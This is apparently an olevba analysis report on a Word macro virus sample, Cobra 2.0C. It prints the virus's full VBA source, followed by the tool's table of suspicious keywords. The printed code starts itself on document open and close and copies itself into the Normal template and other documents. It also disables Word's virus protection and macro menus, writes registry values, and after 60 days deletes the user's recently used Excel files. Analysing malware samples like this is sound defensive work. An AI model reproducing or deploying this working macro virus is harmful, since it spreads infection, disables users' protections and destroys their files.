olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.z
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.z - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Cobra_20C.bas 
in file: ./Virus.MSWord.Cobra.z - OLE stream: 'Macros/VBA/Cobra_20C'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0C
Sub FileExit()
Call CobC
Call CobA
Call CobB
Call CobD
WordBasic.FileExit
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub AutoClose()
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub AutoOpen()
Call CobC
Call CobA
Call CobB
Call CobD
End Sub
Sub CobA()
On Error Resume Next
Dim CA, CB, CD, CE, CC
CA = False: CB = False: CD = False: CE = False
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name <> "NewCobra" And CC.Name <> "Cobra_20C" _
And CC.Name <> "ThisDocument" Then
Application.OrganizerDelete _
Source:=NormalTemplate.FullName, _
Name:=CC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name <> "NewCobra" And CC.Name <> "Cobra_20C" _
And CC.Name <> "ThisDocument" And CC.Name <> _
"Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, _
Name:=CC.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CA = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "NewCobra" Then CB = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "NewCobra" Then CD = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CE = True
Next
If CD = False And CE = False And CA = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
If CD = False And CE = False And CB = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If CA = True And CB = False Then
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:="Cobra_20C", NewName:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
ElseIf CA = False And CB = True Then
Application.OrganizerRename Source:=ActiveDocument.FullName, _
Name:="NewCobra", NewName:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobB()
On Error Resume Next
Dim CA, CB, CD, CE, CC
CA = False: CB = False: CD = False: CE = False
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CA = True
Next
For Each CC In NormalTemplate.VBProject.VBComponents
If CC.Name = "NewCobra" Then CB = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "Cobra_20C" Then CD = True
Next
For Each CC In ActiveDocument.VBProject.VBComponents
If CC.Name = "NewCobra" Then CE = True
Next
If CD = False And CE = False And CA = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="Cobra_20C", Object:=wdOrganizerObjectProjectItems
End If
If CD = False And CE = False And CB = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, _
Name:="NewCobra", Object:=wdOrganizerObjectProjectItems
End If
If CA = True Then
Application.OrganizerRename Source:=NormalTemplate, _
Name:="Cobra_20C", NewName:="NewCobra", _
Object:=wdOrganizerObjectProjectItems
End If
If CB = True Then
Application.OrganizerRename Source:=NormalTemplate, _
Name:="NewCobra", NewName:="Cobra_20C", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub CobC()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub CobD()
On Error Resume Next
Dim DM, CM, SR
DM = False
For Each CE In ActiveDocument.VBProject.VBComponents
If CE.Name = "MoreInfect" Then
DM = True
End If
Next
If DM = True Then
If ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.Lines(1, 1) = "Sub FileNew()" Then
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.ReplaceLine 1, "Sub FileSaveAs()"
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.InsertLines 23, "Dialogs(wdDialogFileSaveAs).Show"
Else
ActiveDocument.VBProject.VBComponents("MoreInfect"). _
CodeModule.ReplaceLine 1, "Sub FileNew()"
End If
End If
If DM = False Then
Set CM = ActiveDocument.VBProject.VBComponents.Add(1)
CM.Name = "MoreInfect"
MoreCode = "Sub FileNew()" + _
Chr(13) + "On Error Resume Next" + _
Chr(13) + "Dialogs(wdDialogFileNew).Show" + _
Chr(13) + "SR = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOwner"")" + _
Chr(13) + "If SR <> ""Cobra"" Then" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOwner"") = ""Cobra""" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""RegisteredOrganization"") = ""349,PB/ER/DHK-1217/BD""" + _
Chr(13) + "End If" + _
Chr(13) + "ID = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"")" + _
Chr(13) + "If Not IsDate(ID) Then" + _
Chr(13) + "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"") = Format(Date, ""mm/dd/yyyy"")" + _
Chr(13) + "End If" + _
Chr(13) + "ID = System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\"", ""InfectDate"")" + _
Chr(13) + "DT = Format(Date, ""mm/dd/yyyy"")" + _
Chr(13) + "IF DateValue(DT)-DateValue(ID)>60 Then" + _
Chr(13) + "Dim FL(4)" + _
Chr(13) + "For i = 1 To 4" + _
Chr(13) + "FL(i) = System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Recent File List"", ""File"" & Trim(Str(i)))" + _
Chr(13) + "Next" + _
Chr(13) + "For i = 1 To 4" + _
Chr(13) + "If FL(i)<>"""" Then Kill FL(i)" + _
Chr(13) + "Next" + _
Chr(13) + "End If" + _
Chr(13) + "End Sub"
CM.CodeModule.InsertLines 1, MoreCode
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, _
FileFormat:=wdFormatDocument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

